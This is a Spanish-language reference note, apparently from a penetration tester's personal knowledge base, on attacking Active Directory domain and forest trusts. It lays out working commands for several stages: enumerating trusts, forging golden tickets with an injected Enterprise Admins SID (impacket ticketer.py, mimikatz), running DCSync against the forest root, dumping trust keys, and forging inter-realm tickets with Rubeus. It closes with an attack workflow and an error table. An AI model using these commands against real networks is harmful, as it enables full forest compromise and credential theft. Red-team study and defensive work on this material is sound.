---
tipo: meta
aliases:
  - trusts AD
  - domain trust
  - SID history attack
  - forest escalation
tags:
  - meta/referencia
  - dominio/ad
---

# AD confianzas - matriz de referencia

> [!info] Referencia pura, no un zettel
> Enumerar las confianzas y cruzarlas. El criterio está en [[Escalada intra-bosque por SID History]] y [[Movimiento entre bosques por la clave de confianza]]; el modelo, en [[MOC - Active Directory]].

## 0. Los conceptos que deciden todo

| Concepto | Qué significa para el ataque |
|---|---|
| **El límite es el bosque, no el dominio** | Comprometer cualquier dominio del bosque → el bosque, vía SID History |
| Intra-bosque | Filtrado de SID **off** por defecto → SID History funciona |
| Entre bosques | Filtrado de SID **on** por defecto → SID History bloqueado; usar la clave de confianza |
| Dirección saliente | El otro confía en mí → puedo entrar allá |
| Dirección entrante | Yo confío en el otro → el otro entra a lo mío |
| Transitiva | La confianza se hereda a los dominios que a su vez confían |
| Selectiva | Cada cuenta necesita permiso explícito; cruzar no basta |

## 1. Enumerar las confianzas

```
# PowerView
Get-DomainTrust
Get-ForestTrust
Get-DomainTrustMapping         # todo el mapa, transitivo

# nativo
nltest /domain_trusts /all_trusts
nltest /trusted_domains

# BloodHound: las aristas de confianza en el grafo
# netexec / impacket
nxc ldap dc -u user -p pass -M enum_trusts
```

Sacar el SID de cada dominio —hace falta para el SID History y la forja inter-reino:

```
Get-DomainSID -Domain raiz.local
lookupsid.py dominio.local/user:pass@dc 0
```

El SID de *Enterprise Admins* de la raíz es `S-1-5-21-<sid-raíz>-519`.

## 2. Escalada intra-bosque — SID History

Ver [[Escalada intra-bosque por SID History]]. Con el hash de `krbtgt` del dominio hijo:

```
# impacket — golden ticket del hijo con el SID de Enterprise Admins de la raíz
ticketer.py -nthash HASH_KRBTGT_HIJO -domain-sid SID_HIJO -domain hijo.local \
  -extra-sid SID_RAIZ-519 Administrador
export KRB5CCNAME=Administrador.ccache

# DCSync contra la RAÍZ del bosque con ese ticket
secretsdump.py -k -no-pass raiz.local/Administrador@dc-raiz.raiz.local
```

```
# mimikatz — el /sids: inyecta el SID extra
kerberos::golden /user:Administrador /domain:hijo.local /sid:SID_HIJO \
  /krbtgt:HASH /sids:SID_RAIZ-519 /ptt
```

`SID_RAIZ-519` es Enterprise Admins de la raíz. Ese es el salto al bosque.

## 3. Movimiento entre bosques — clave de confianza

Ver [[Movimiento entre bosques por la clave de confianza]]. Sacar la clave de la confianza:

```
# DCSync del objeto de confianza (la cuenta DOMINIO-CONFIABLE$)
secretsdump.py -just-dc-user 'CONFIABLE$' dominio.local/admin:pass@dc

# o el hash de la cuenta de confianza directamente
lsadump::trust /patch          # mimikatz, en el DC
```

Forjar el TGT de referencia inter-reino con esa clave:

```
ticketer.py -nthash HASH_CONFIANZA -domain-sid SID_ORIGEN -domain origen.local \
  -spn krbtgt/destino.local usuario
# usar contra el destino
getST.py -k -no-pass -spn CIFS/servidor.destino.local destino.local/usuario
```

Rubeus, desde Windows:

```
Rubeus.exe asktgs /ticket:trust.kirbi /service:CIFS/servidor.destino.local /dc:dc.destino.local /ptt
```

## 4. Qué se puede inyectar según la frontera

| Frontera | SID History | Resultado |
|---|---|---|
| Intra-bosque | Funciona (`-extra-sid` con `-519`) | Enterprise Admins → todo el bosque |
| Entre bosques, filtrado on | Bloqueado | Solo el usuario forjado, sin privilegio inyectado |
| Entre bosques, filtrado off (mala config) | Funciona | Como intra-bosque |
| Confianza selectiva | Cruzar no basta | Necesita permiso explícito por cuenta |

## 5. Orden de trabajo

1. `Get-DomainTrustMapping` — el mapa completo.
2. ¿Estoy en un dominio no-raíz del bosque y tengo su `krbtgt`? → § 2, escalar a la raíz.
3. ¿Hay una confianza saliente a otro bosque? → § 3, cruzar con la clave.
4. Confirmar el filtrado de SID antes de invertir: decide si el cruce da privilegio o solo presencia.

## 6. Tabla de errores

| Lo que ves | Qué pasa |
|---|---|
| El SID inyectado no da privilegio | Filtrado de SID activo en esa confianza |
| El ticket inter-reino es rechazado | Clave de confianza equivocada, o confianza selectiva |
| `Get-DomainTrust` no muestra nada | Dominio sin confianzas, o falta permiso de lectura |
| Cruzo pero no accedo a nada | El usuario forjado no tiene permisos en el destino |
| `KDC_ERR_S_PRINCIPAL_UNKNOWN` en inter-reino | SPN o dominio destino mal escrito en la forja |
| El `-extra-sid` no escala | El SID de la raíz está mal; verificar con `Get-DomainSID` |

## Relacionadas

[[MOC - Active Directory]] · [[Escalada intra-bosque por SID History]] · [[Movimiento entre bosques por la clave de confianza]] · [[AD persistencia - matriz de referencia]] · [[AD enumeración - matriz de referencia]]
